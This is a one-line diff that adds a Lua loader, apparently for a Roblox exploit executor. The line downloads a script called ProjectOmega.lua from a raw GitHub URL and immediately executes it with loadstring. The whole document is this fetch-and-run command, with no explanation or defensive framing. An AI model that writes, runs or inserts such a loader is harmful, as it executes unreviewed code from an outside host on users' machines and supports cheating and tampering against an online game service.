@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sxnsiferous/projectomega/main/ProjectOmega.lua"))()
